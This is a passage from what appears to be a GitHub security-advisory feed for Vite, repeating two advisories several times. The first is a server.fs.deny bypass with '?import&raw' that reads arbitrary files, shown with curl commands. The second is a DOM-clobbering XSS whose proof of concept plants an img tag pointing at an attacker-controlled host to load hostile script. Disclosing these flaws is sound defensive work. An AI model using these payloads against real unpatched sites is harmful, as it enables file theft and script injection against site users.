<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45811">https://nvd.nist.gov/vuln/detail/CVE-2024-45811</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-19T18:34:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45811">https://nvd.nist.gov/vuln/detail/CVE-2024-45811</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
